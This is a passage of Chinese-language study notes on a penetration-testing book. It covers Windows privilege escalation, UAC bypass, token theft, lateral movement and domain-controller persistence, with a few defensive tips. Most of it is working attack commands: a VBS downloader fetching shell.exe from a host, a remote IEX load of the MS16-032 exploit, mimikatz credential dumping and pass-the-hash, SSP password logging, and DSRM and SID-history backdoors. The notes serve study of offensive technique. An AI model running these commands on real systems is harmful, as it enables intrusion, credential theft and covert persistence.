+<pre><code>Set Post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)Set shell = CreateObject(&quot;Wscript.Shell&quot;)post.Open &quot;GET&quot;,&quot;http://IP/shell.exe&quot;,0post.Send()Set aGet = CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode = 3aGet.Type = 1aGet.Open()aGet.Write(post.responseBody)aGet.SaveToFile &quot;C:\test\shell.exe&quot;,2
+</code></pre>
+<p>执行下面命令即可在目标主机上下载shell.exe文件</p>
+<pre><code>Cscript download.vbs
+</code></pre>
+<h4 id="利用-Debug"><a href="#利用-Debug" class="headerlink" title="利用 Debug"></a>利用 Debug</h4><h4 id="利用-Nishang-上传"><a href="#利用-Nishang-上传" class="headerlink" title="利用 Nishang 上传"></a>利用 Nishang 上传</h4><h4 id="利用-bitsadmin-下载"><a href="#利用-bitsadmin-下载" class="headerlink" title="利用 bitsadmin 下载"></a>利用 bitsadmin 下载</h4><h2 id="权限提升分析及防御"><a href="#权限提升分析及防御" class="headerlink" title="权限提升分析及防御"></a>权限提升分析及防御</h2><p>Windows 最高权限 Trusted Installer，可以修改系统文件，高于 System</p>
+<p>提权分为横向提权和纵向提权</p>
+<h3 id="系统内核溢出漏洞提权分析及防范"><a href="#系统内核溢出漏洞提权分析及防范" class="headerlink" title="系统内核溢出漏洞提权分析及防范"></a>系统内核溢出漏洞提权分析及防范</h3><h4 id="通过手动执行命令发现缺失补丁"><a href="#通过手动执行命令发现缺失补丁" class="headerlink" title="通过手动执行命令发现缺失补丁"></a>通过手动执行命令发现缺失补丁</h4><pre><code>//查看当前权限whoami /groupssysteminfowmic qfe get Caption,Description,HotFixID,InstalledOn
+</code></pre>
+<p>这个链接里也描述了一些方法和工具：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/">https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/</a></p>
+<p>可以通过对比KB来判断是否存在提权漏洞。</p>
+<h4 id="MS16-032"><a href="#MS16-032" class="headerlink" title="MS16-032"></a>MS16-032</h4><p>可以使用Invoke-MS16-032.ps1工具:<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</a></p>
+<pre><code>Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;
+</code></pre>
+<p>远程加载：</p>
+<pre><code>powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1);Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;&quot;
+</code></pre>
+<p>MS16-032的补丁编号为KB3139914</p>
+<h4 id="利用MSF发现缺失补丁"><a href="#利用MSF发现缺失补丁" class="headerlink" title="利用MSF发现缺失补丁"></a>利用MSF发现缺失补丁</h4><pre><code>use post/windows/gather/enum_patches
+</code></pre>
+<h4 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h4><p>将systeminfo信息输出到txt文件中</p>
+<pre><code>systeminfo &gt; info.txt
+</code></pre>
+<p>windows-exploit-suggester下载地址：<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<pre><code>./windows-exploit-suggester.py --updatepip install xlrd --upgrade/windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt
+</code></pre>
+<p>MSF中也存在此模块</p>
+<pre><code>use post/multi/recon/local_exploit_suggester
+</code></pre>
+<h4 id="Powershell中的Sherlock"><a href="#Powershell中的Sherlock" class="headerlink" title="Powershell中的Sherlock"></a>Powershell中的Sherlock</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a></p>
+<pre><code>. .\sherlock.ps1find-AllVulns
+</code></pre>
+<h3 id="Windows-操作系统配置错误急用分析和防范"><a href="#Windows-操作系统配置错误急用分析和防范" class="headerlink" title="Windows 操作系统配置错误急用分析和防范"></a>Windows 操作系统配置错误急用分析和防范</h3><h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><p>使用Powerup</p>
+<pre><code>. .\Powerup.ps1Invoke-AllChecks
+</code></pre>
+<h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><p>这个漏洞在书中说明了利用方式，但是并没有说明根本原理，这个漏洞是由于使用CreateProcess函数创建进程时对第二个参数中的文件路径没有使用双引号括起来，这个不再说明了，在之前整理ATT&amp;CK的文档的时候已经弄过了很多遍。可以参考这个文档：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sevck/p/8488469.html">https://www.cnblogs.com/sevck/p/8488469.html</a></p>
+<p>书中说到了一个查找漏洞存在的方法：</p>
+<pre><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /c &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
+</code></pre>
+<p>MSF中存在能够利用的模块（需要有session）：</p>
+<pre><code>use trusted_service_path
+</code></pre>
+<h4 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h4><p>利用的是网络管理员在内网中给多台机器配置环境的配置文件中的敏感信息，如密码等。常用配置文件目录：</p>
+<pre><code>sysprep.infsysprep.xmlunattend.xmlunattended.xml
+</code></pre>
+<p>MSF中的利用模块：</p>
+<pre><code>use post/windows/gather/enum_unattend
+</code></pre>
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>查看当前计划任务：</p>
+<pre><code>schtasks /query /fo LIST /v
+</code></pre>
+<p>这里提到了一个工具，AccessChk用于在Windows中运行一些系统或程序的高级查询，管理和故障排除工作。可以通过这个工具来查看指定目录的权限配置情况，如果当前权限有某个高权限的程序执行文件的写权限，那么就可以替换高权限文件进行权限提升。（这里说到的是使用计划任务来进行定时执行）</p>
+<p>使用方法：</p>
+<pre><code>//不弹框运行accesschk.exe /accepteula//这里原书中的命令空格被吞了，说的是列出某个驱动器下所有权限配置有缺陷的文件夹,但是使用了之后发现应该不会遍历所有的文件夹.\accesschk.exe -uwdqs Users c:\.\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\
+</code></pre>
+<h4 id="Empire-的-Powerup-模块"><a href="#Empire-的-Powerup-模块" class="headerlink" title="Empire 的 Powerup 模块"></a>Empire 的 Powerup 模块</h4><h3 id="组策略首选项提权分析及防范"><a href="#组策略首选项提权分析及防范" class="headerlink" title="组策略首选项提权分析及防范"></a>组策略首选项提权分析及防范</h3><p>这个说的就是查找组策略配置文件中加密过的密码，主要就是Group.xml等文件。</p>
+<p>可以直接使用PowerSploit中的Get-GPPPassword.ps1来获取</p>
+<pre><code>. .\Get-GPPpassword.ps1Get-GppPassword
+</code></pre>
+<p>然后使用gpprefdecrypt.py脚本进行解密:</p>
+<pre><code>python gpprefdecrypt.py XXXXXXXXXXXXXXXXXXXX
+</code></pre>
+<h3 id="绕过-UAC-提权分析及防范"><a href="#绕过-UAC-提权分析及防范" class="headerlink" title="绕过 UAC 提权分析及防范"></a>绕过 UAC 提权分析及防范</h3><h4 id="MSF-中的-Bypassuac"><a href="#MSF-中的-Bypassuac" class="headerlink" title="MSF 中的 Bypassuac"></a>MSF 中的 Bypassuac</h4><pre><code>use exploit/windows/local/bypassuacset session Xrun
+</code></pre>
+<h4 id="MSF-中的-RunAs"><a href="#MSF-中的-RunAs" class="headerlink" title="MSF 中的 RunAs"></a>MSF 中的 RunAs</h4><pre><code>use exploit/windows/local/askset session Xrun
+</code></pre>
+<p>运行后目标主机会弹出一个 UAC 的框，点击是之后才会回弹一个新的 session，如果弹回的不是 system 权限的 session 可以使用 getsystem 命令提升</p>
+<h4 id="Nishang-中的-Invoke-PsUACme-模块"><a href="#Nishang-中的-Invoke-PsUACme-模块" class="headerlink" title="Nishang 中的 Invoke-PsUACme 模块"></a>Nishang 中的 Invoke-PsUACme 模块</h4><pre><code>/使用sysprep方法并执行默认的payloadInvoke-PsUACme -Verbose//使用oobe方法并执行默认的payloadInvoke-PsUACme -methed oobe -Verbose//使用oobe方法执行自定义的payloadInvoke-PsUACme -methed oobe -Payload &quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot;
+</code></pre>
+<p>可以使用payloadpath参数指定payload的路径。</p>
+<h4 id="Empire-中的-bypassuac-模块"><a href="#Empire-中的-bypassuac-模块" class="headerlink" title="Empire 中的 bypassuac 模块"></a>Empire 中的 bypassuac 模块</h4><pre><code>usemodule privesc/bypassuac
+</code></pre>
+<h3 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h3><pre><code>access token访问令牌：代表访问控制操作主体的系统对象security token认证令牌或硬件令牌：是一种用于实现计算机身份校验的物理设备，例如U盾session token会话令牌：是交互会话中唯一的身份标识符
+</code></pre>
+<p>伪造令牌攻击的核心是Kerberos协议。</p>
+<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>MSF中的利用(已经有meterpreter)：</p>
+<pre><code>use incognitolist_tokens -u
+</code></pre>
+<p>两种类型的令牌：</p>
+<pre><code>Delegation Tokens 授权令牌：支持交互式登录（例如可以通过远程桌面登录及访问）Impersonation Tokens 模拟令牌：支持非交互式的会话
+</code></pre>
+<p>在MSF中可以选择使用某一个特定的TOKEN</p>
+<pre><code>impersonate_token
+</code></pre>
+<h4 id="Rotten-Potato本地提权分析"><a href="#Rotten-Potato本地提权分析" class="headerlink" title="Rotten Potato本地提权分析"></a>Rotten Potato本地提权分析</h4><p>利用的前提是系统中要存在有效的令牌，然后用这个工具快速模拟用户令牌，书中的环境存在SYSTEM的token，所以可以使用下面的命令进行窃取</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p>
+<pre><code>upload /opt/RottenPotato/rottenpotato.exeexecute -HC -f rottenpotato.exeimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;
+</code></pre>
+<h4 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h4><p>这里说到了使用MSF的migrate命令，借助system权限的进程进行执行命令</p>
+<h4 id="Empire-下的令牌窃取分析"><a href="#Empire-下的令牌窃取分析" class="headerlink" title="Empire 下的令牌窃取分析"></a>Empire 下的令牌窃取分析</h4><p>使用Empire下的creds命令和mimikatz模块进行pth攻击</p>
+<h2 id="无凭证条件下的权限获取分析及防范"><a href="#无凭证条件下的权限获取分析及防范" class="headerlink" title="无凭证条件下的权限获取分析及防范"></a>无凭证条件下的权限获取分析及防范</h2><p>使用Responder进行欺骗</p>
+<h2 id="域内横向移动分析及防御"><a href="#域内横向移动分析及防御" class="headerlink" title="域内横向移动分析及防御"></a>域内横向移动分析及防御</h2><h3 id="常用-Windows-远程连接和命令"><a href="#常用-Windows-远程连接和命令" class="headerlink" title="常用 Windows 远程连接和命令"></a>常用 Windows 远程连接和命令</h3><p>IPC</p>
+<pre><code>net use \\192.168.1.10\ipc$ &quot;admin123&quot; /user:administrator
+</code></pre>
+<p>dir</p>
+<pre><code>dir \\192.168.1.10\c$
+</code></pre>
+<p>tasklist</p>
+<pre><code>tasklist /S 192.168.1.10 /U administrator /P admin123
+</code></pre>
+<p>at：是Windows server 2008之前的计划任务命令</p>
+<pre><code>at \\192.168.1.10 4:11PM C:\shell.bat
+</code></pre>
+<p>创建之后会有一个任务ID，指定任务ID可以删除</p>
+<pre><code>at \\192.168.1.10 7 /delete
+</code></pre>
+<p>schtasks</p>
+<pre><code>schtasks /create /s 192.168.1.10 /tn test /sc onstart /tr C:\calc.bat /ru system /f
+</code></pre>
+<h3 id="ATT-amp-CK-Credential"><a href="#ATT-amp-CK-Credential" class="headerlink" title="ATT&amp;CK Credential"></a>ATT&amp;CK Credential</h3><h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>基本的执行方式：</p>
+<pre><code>wmic /node:192.168.1.10 /user:administrator /password:admin123 process call create &quot;cmd.exe&quot; /c ipconfig &gt; ip.txt&quot;
+</code></pre>
+<p>其他工具：</p>
+<p>impacket中的wmiexec，成功连接之后会有一个交互式的命令行</p>
+<pre><code>wmiexec.py administrator:admin123@192.168.1.10
+</code></pre>
+<p>wmiexec.vbs</p>
+<pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.10 administrator admin123cscript.exe wmiexec.vbs /cmd 192.168.1.10 administrator admin123 &quot;ipconfig&quot;
+</code></pre>
+<p>Invoke-WMICommand</p>
+<p>Invoke-WMICommand是PowerSpolit中的脚本：</p>
+<pre><code>$user = &quot;test\administrator&quot;$password = ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $password$remote = Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.1.10$remote.PayloadOutput
+</code></pre>
+<p>Invoke-WMIMethod是powershell自带的</p>
+<pre><code>$user = &quot;test\administrator&quot;$password = ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $passwordInvoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;ipconfig&quot; -ComputerName &quot;192.168.1.10&quot; -Credential $Cred
+</code></pre>
+<h3 id="SMBEXEC"><a href="#SMBEXEC" class="headerlink" title="SMBEXEC"></a>SMBEXEC</h3><p>Impacket中有这个插件</p>
+<p>Linux版本下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec.git">https://github.com/brav0hax/smbexec.git</a></p>
+<p>安装命令：</p>
+<pre><code>git clone https://github.com/brav0hax/smbexec.gitchmod +x install.sh &amp;&amp; ./install.sh
+</code></pre>
+<h3 id="DCOM-在远程系统中的使用"><a href="#DCOM-在远程系统中的使用" class="headerlink" title="DCOM 在远程系统中的使用"></a>DCOM 在远程系统中的使用</h3><h4 id="通过本地-DCOM-执行命令"><a href="#通过本地-DCOM-执行命令" class="headerlink" title="通过本地 DCOM 执行命令"></a>通过本地 DCOM 执行命令</h4><p>获取DCOM程序列表：</p>
+<pre><code>Get-CimInstance Win32_DCOMApplicationGet-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
+</code></pre>
+<h4 id="使用-DCOM-在远程机器上执行命令"><a href="#使用-DCOM-在远程机器上执行命令" class="headerlink" title="使用 DCOM 在远程机器上执行命令"></a>使用 DCOM 在远程机器上执行命令</h4><p>1调用MMC20.Application远程执行命令</p>
+<pre><code>net use \\192.168.1.10 &quot;admin123&quot; /user:test\xiaom$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.10&quot;))$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c cmd.exe&quot;,&quot;&quot;)
+</code></pre>
+<p>2、调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
+<pre><code>$com = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.1.10&quot;)$obj = [System.Activator]::CreateInstance($com)$item = $obj.item()$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)关于这个方法的详细内容可以参考 https://bbs.pediy.com/thread-226540-1.htm
+</code></pre>
+<h3 id="SPN-在域环境中的应用"><a href="#SPN-在域环境中的应用" class="headerlink" title="SPN 在域环境中的应用"></a>SPN 在域环境中的应用</h3><h3 id="Exchange-邮件服务器安全防范"><a href="#Exchange-邮件服务器安全防范" class="headerlink" title="Exchange 邮件服务器安全防范"></a>Exchange 邮件服务器安全防范</h3><p>查看邮件数据库</p>
+<pre><code>//查询之前需要安装命令add-pssnapin microsoft.exchange *Get-MailboxDatabase -server &quot;Exchange1&quot;Get-MailboxDatabase -Identity &#39;Mailbox Database 1894576043&#39; | Format-List Name,EdbFilePath,LogFolderPath
+</code></pre>
+<h2 id="域控制器安全"><a href="#域控制器安全" class="headerlink" title="域控制器安全"></a>域控制器安全</h2><h4 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h4><h3 id="导出-ntds-dit-中的散列值"><a href="#导出-ntds-dit-中的散列值" class="headerlink" title="导出 ntds.dit 中的散列值"></a>导出 ntds.dit 中的散列值</h3><h3 id="利用-dcsync-获取散列值"><a href="#利用-dcsync-获取散列值" class="headerlink" title="利用 dcsync 获取散列值"></a>利用 dcsync 获取散列值</h3><h3 id="使用-MSF-获取散列值"><a href="#使用-MSF-获取散列值" class="headerlink" title="使用 MSF 获取散列值"></a>使用 MSF 获取散列值</h3><h3 id="Kerberos-与用户提权漏洞分析与防范"><a href="#Kerberos-与用户提权漏洞分析与防范" class="headerlink" title="Kerberos 与用户提权漏洞分析与防范"></a>Kerberos 与用户提权漏洞分析与防范</h3><h2 id="跨域攻击分析与防御"><a href="#跨域攻击分析与防御" class="headerlink" title="跨域攻击分析与防御"></a>跨域攻击分析与防御</h2><h3 id="利用域信任关系的跨域攻击分析"><a href="#利用域信任关系的跨域攻击分析" class="headerlink" title="利用域信任关系的跨域攻击分析"></a>利用域信任关系的跨域攻击分析</h3><h4 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h4><p>这里说到了lg.exe这个工具，能够用来枚举远程主机用户和组的信息。</p>
+<pre><code>//枚举域中的用户组lg.exe &lt;domain name&gt;\.//枚举远程机器的本地组用户lg.exe \\dc2012//获取远程用户中全部用户的SIDlg.exe \\dc2012 -lu -sidsout//获取指定组中所有成员的SIDlg.exe \\dc2012\administrators -sidsout
+</code></pre>
+<h3 id="防范跨域攻击"><a href="#防范跨域攻击" class="headerlink" title="防范跨域攻击"></a>防范跨域攻击</h3><h2 id="权限维持分析及防御"><a href="#权限维持分析及防御" class="headerlink" title="权限维持分析及防御"></a>权限维持分析及防御</h2><h3 id="操作系统后门分析与防范"><a href="#操作系统后门分析与防范" class="headerlink" title="操作系统后门分析与防范"></a>操作系统后门分析与防范</h3><h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><p>这个在ATT&amp;CK中的Persistence一章中的Registry Run Keys &#x2F; Startup Folder中有提到。命令如下：</p>
+<pre><code>REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RegRun /t REG_SZ /d &quot;c:\windows\system32\calc.exe&quot;
+</code></pre>
+<h4 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h4><h4 id="meterpreter-后门"><a href="#meterpreter-后门" class="headerlink" title="meterpreter 后门"></a>meterpreter 后门</h4><h4 id="Cymothoa-后门"><a href="#Cymothoa-后门" class="headerlink" title="Cymothoa 后门"></a>Cymothoa 后门</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cymothoa/">https://sourceforge.net/projects/cymothoa/</a></p>
+<p>安装可参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/88834099">https://blog.csdn.net/qq_17204441/article/details/88834099</a></p>
+<pre><code>./cymothoa -s 0 -p &lt;process id&gt; -y &lt;port&gt;
+</code></pre>
+<p>安装成功后使用nc等工具连接设置的端口即可。</p>
+<h4 id="WMI-后门"><a href="#WMI-后门" class="headerlink" title="WMI 后门"></a>WMI 后门</h4><p>WMI后门的特征是无文件和无进程，将代码加密存储于WMI中，达到所谓的无文件，当设定的条件被满足时，系统将自动启动Powershell进程去执行后门程序，执行后进程将会消失。</p>
+<p>Empire下有WMI相关的模块可以使用：</p>
+<pre><code>usemodule powershell/persistence/elevated/wmi
+</code></pre>
+<p>可以在目标主机中使用命令查看存在的后门：</p>
+<pre><code>Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer
+</code></pre>
+<p>清理WMI后门的方法：删除自动运行列表中的恶意WMI条目，使用Get-WMIObject命令删除与WMI持久化相关的组件。</p>
+<h3 id="Web-后门"><a href="#Web-后门" class="headerlink" title="Web 后门"></a>Web 后门</h3><h4 id="Nishang-下的-WEBShell"><a href="#Nishang-下的-WEBShell" class="headerlink" title="Nishang 下的 WEBShell"></a>Nishang 下的 WEBShell</h4><h4 id="Weevely-后门"><a href="#Weevely-后门" class="headerlink" title="Weevely 后门"></a>Weevely 后门</h4><h4 id="webacoo-后门工具"><a href="#webacoo-后门工具" class="headerlink" title="webacoo 后门工具"></a>webacoo 后门工具</h4><h3 id="域控制器权限持久化分析与防范"><a href="#域控制器权限持久化分析与防范" class="headerlink" title="域控制器权限持久化分析与防范"></a>域控制器权限持久化分析与防范</h3><h4 id="DSRM-后门"><a href="#DSRM-后门" class="headerlink" title="DSRM 后门"></a>DSRM 后门</h4><p>使用mimikatz查看krbtgt账户密码hash值</p>
+<pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /name:krbtgt&quot; exit
+</code></pre>
+<p>查看SAM文件中本地管理员的NTLM HASH值</p>
+<pre><code>.\mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit
+</code></pre>
+<p>将DSRM hash和kebtgt的密码同步：</p>
+<pre><code>ntdsutilset dsrm passwordSYNC FROM DOMAIN account krbtgtq
+</code></pre>
+<p>再次查看会发现DSRM密码和krbtgt的密码相同，然后修改DSRM的登陆方式，这个注册表键值为2表示”在任何情况下都可以使用DSRM管理员账号登陆域控制器”：</p>
+<pre><code>New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD
+</code></pre>
+<p>使用mimikatz进行pth攻击：</p>
+<pre><code>.\mimikatz.exe &quot;privilege::Debug&quot; &quot;sekurlsa::pth /domain:DC /user:administrator /ntlm:XXXXXXXXXXX&quot;
+</code></pre>
+<p>DSRM后门防御措施：</p>
+<pre><code>检查hklm\system\currentcontrolset\control\lsa\dsrmadminlogonbehavior注册表键值的值，确认值为1定期修改DSRM的账号经常检查ID为4794的日志
+</code></pre>
+<h4 id="SSP-维持域控权限"><a href="#SSP-维持域控权限" class="headerlink" title="SSP 维持域控权限"></a>SSP 维持域控权限</h4><p>方式一：</p>
+<pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit
+</code></pre>
+<p>注销之后执行命令查看明文密码：</p>
+<pre><code>powershell.exe cat c:\windows\system32\mimilsa.log
+</code></pre>
+<p>方式二：</p>
+<pre><code>powershell.exe cp .\mimilib.dll C:\Windows\System32\Set-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;Security Packages&quot; -value &quot;mimilib.dll&quot;
+</code></pre>
+<p>重启之后使用命令查看密码：</p>
+<pre><code>powershell.exe cat c:\windows\system32\kiwissp.log
+</code></pre>
+<p>防御措施：</p>
+<pre><code>查看hklm\system\currentcontrolset\control\lsa\Security Packages注册表项是否含有可疑的DLL文件检查C:\windows\system32\目录下是否存在可疑的文件第三方工具检查
+</code></pre>
+<h4 id="SID-History-后门"><a href="#SID-History-后门" class="headerlink" title="SID History 后门"></a>SID History 后门</h4><p>test为恶意账户，administrator</p>
+<pre><code>Import-module ActiveDirectoryGet-ADUser xiaom -Properties sidhistory.\mimikatz.exe &quot;privilege::Debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:xiaom /new:administrator&quot; exit
+</code></pre>
+<p>此时使用xiaom账号可以访问域控</p>
+<h4 id="Golden-Ticket-and-Silver-Ticket"><a href="#Golden-Ticket-and-Silver-Ticket" class="headerlink" title="Golden Ticket and Silver Ticket"></a>Golden Ticket and Silver Ticket</h4><h4 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h4><h4 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h4><p>这个方法要使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存，在目标系统中启动管理员权限的powershell：</p>
+<pre><code>. .\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
+</code></pre>
+<p>此时如果再修改用户密码则修改之后的密码会记录在C:\windows\Temp\password.txt文件中。</p>
+<p>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
+<p>参考地址：<a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
+<h3 id="Nishang-下的脚本后门分析与防范"><a href="#Nishang-下的脚本后门分析与防范" class="headerlink" title="Nishang 下的脚本后门分析与防范"></a>Nishang 下的脚本后门分析与防范</h3><h4 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h4><h4 id="Add-scrnSaveBackdoor"><a href="#Add-scrnSaveBackdoor" class="headerlink" title="Add-scrnSaveBackdoor"></a>Add-scrnSaveBackdoor</h4><h4 id="Execute-OnTime"><a href="#Execute-OnTime" class="headerlink" title="Execute-OnTime"></a>Execute-OnTime</h4><h4 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h4><h2 id="ATT-amp-CK-框架"><a href="#ATT-amp-CK-框架" class="headerlink" title="ATT&amp;CK 框架"></a>ATT&amp;CK 框架</h2><h3 id="InitialAccess（入口点）"><a href="#InitialAccess（入口点）" class="headerlink" title="InitialAccess（入口点）"></a>InitialAccess（入口点）</h3><h3 id="Execution（命令执行）"><a href="#Execution（命令执行）" class="headerlink" title="Execution（命令执行）"></a>Execution（命令执行）</h3><h3 id="Persistence（持久化）"><a href="#Persistence（持久化）" class="headerlink" title="Persistence（持久化）"></a>Persistence（持久化）</h3><h3 id="PrivilegeEscalation（权限提升）"><a href="#PrivilegeEscalation（权限提升）" class="headerlink" title="PrivilegeEscalation（权限提升）"></a>PrivilegeEscalation（权限提升）</h3><h3 id="DefenseEvasion（绕过防御）"><a href="#DefenseEvasion（绕过防御）" class="headerlink" title="DefenseEvasion（绕过防御）"></a>DefenseEvasion（绕过防御）</h3><h3 id="Discovery（基础信息收集）"><a href="#Discovery（基础信息收集）" class="headerlink" title="Discovery（基础信息收集）"></a>Discovery（基础信息收集）</h3><h3 id="lateral-movement（横向渗透）"><a href="#lateral-movement（横向渗透）" class="headerlink" title="lateral-movement（横向渗透）"></a>lateral-movement（横向渗透）</h3><h3 id="C-amp-C（命令控制）"><a href="#C-amp-C（命令控制）" class="headerlink" title="C&amp;C（命令控制）"></a>C&amp;C（命令控制）</h3><h3 id="Exfiltration（信息窃取）"><a href="#Exfiltration（信息窃取）" class="headerlink" title="Exfiltration（信息窃取）"></a>Exfiltration（信息窃取）</h3><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="Keyberos"><a href="#Keyberos" class="headerlink" title="Keyberos"></a>Keyberos</h3><h4 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h4><p>AD 存储关于网络对象的相关信息，是管理员和用户可以轻松的查找和使用这些信息。</p>
+<p>网络对象有：用户、用户组、计算机、域、组织单位以及安全策略等。</p>
+<h4 id="Keyberos-1"><a href="#Keyberos-1" class="headerlink" title="Keyberos"></a>Keyberos</h4><p>Keyberos 是一种网络认证协议，认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并<strong>假定网络上传送的数据包可以被任意地读取、修改和插入数据</strong>。</p>
+<h4 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h4><ul>
+<li>客户端</li>
+<li>服务端</li>
+<li>KDC（DC0</li>
+</ul>
+<h4 id="KDC-的组成"><a href="#KDC-的组成" class="headerlink" title="KDC 的组成"></a>KDC 的组成</h4><ul>
+<li>AD（Account Database）：存储所有客户端的白名单，只有在白名单中的客户端才可以申请 TGT</li>
+<li>AS（Authentication Service）：为客户端生成 TGT 的服务</li>
+<li>TGS（Ticket Granting Service）：为客户端生成用于某个服务的 ticket 的 service</li>
+</ul>
